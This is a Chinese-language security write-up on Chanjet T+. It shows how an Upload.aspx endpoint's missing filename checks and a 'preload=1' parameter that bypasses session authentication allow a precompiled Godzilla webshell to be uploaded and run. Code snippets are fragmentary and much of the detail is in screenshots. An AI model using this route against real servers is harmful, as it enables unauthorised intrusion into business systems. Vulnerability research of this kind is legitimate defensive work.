## 二、漏洞审计  

根据网上流传的payload找到文件

SM\\SetupAccount\\Upload.aspx 

![](../Images/4b1788ab4f81052d5488332a6853aa6e.png)

发现该文件为编译的文件。

畅捷通整套程序用了预编译，直接到根目录的bin下找对应的compiled文件

![](../Images/80de869ffc38cf418c024265bf35c538.png)

畅捷通整套程序用了预编译，直接到根目录的bin下找对应的compiled文件

bin\\upload.aspx.9475d17f.compiled

```


<?xml version="1.0" encoding="utf-8"?>
```

  

![](../Images/0085e1494511148e00313c60b8e0fb03.png)

使用dnspy 查看

![](../Images/5b4191462abf54452ac188debd425b46.png)

  

```


// CommonPage\_SetupAccount\_Upload
```

  

代码大概的意思为。上传的文件不大于2M 然后判断Content-Type 是否为其中一个类型。然后写入到images 目录中。文件名没有任何过滤。

构造一下上传代码

```


POST /tplus/SM/SetupAccount/Upload.aspx HTTP/1.1
```

  

![](../Images/5f6c5407aec65fdd8d307f2b0f45f4ae.png)

  

发现需要登陆。那么翻看一下代码好像没有找到鉴权的地方。那么找一下他的引用文件

![](../Images/5b4191462abf54452ac188debd425b46.png)

  

把App\_global.asax 导入到dnspy 中

![](../Images/79e2ef2a09df755dcdf5fc5ee3dedf99.png)

也没有发现什么鉴权的函数之类的。那么再往上找一层 发现他引用了App\_Web\_global.asax.cs.cdcab7d2 这个。那么把dll文件丢进去

发现一个 Application\_PreRequestHandlerExecute 函数。

![](../Images/da2e5a8ffa3d83e5e1f3b8e8b5532e82.png)

参数preload 为1 的时候就不经过下方的session 验证了。

进行尝试

![](../Images/152ad3572bc71a7d9e8bc75a36cd148a.png)

  

```


POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
```

  

发现返回结果不一样了。那么看看images文件中是否有这个文件

![](../Images/ec3ebdabe9a7d5a74f5cbb2fb98da894.png)

发现成功上传了

  

## 三、getshell  

实际访问的时候他返回的错误信息:未预编译文件那么使用绕过的方式

用哥斯拉随便生产一个木马文件

![](../Images/ec51aab33d3100da92f90a524251fcd1.png)

  

然后CMD 执行

```
C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\aspnet\_compiler.exe -v /  -p M:\\iiss D:/iss -fixednames
```

\-p 代表的是你木马的目录。D:\\iss 表示生成在那个目录中。

执行完毕后，查看D:\\iss 目录

![](../Images/79a21bbe8b0ca063b8e39c8fa5c6f39d.png)

把这两个文件上传到bin目录中

![](../Images/819080ddaeb2c5b77f0f2ca1d32ff6bb.png)

```


POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
```

  

上传完成之后访问如下：

http://192.168.1.77:8080/tplus/111.aspx?preload=1

![](../Images/c47f7c566a7db1174d48c74619f8f153.png)

![](../Images/c5668c3544140d1e152f05ee9b78f7b8.png)

备注一定要加preload=1 这个。不然他还是走了验证的通道

![](../Images/e8cb36607a3f7e6c3ef45653dd399f0f.png)
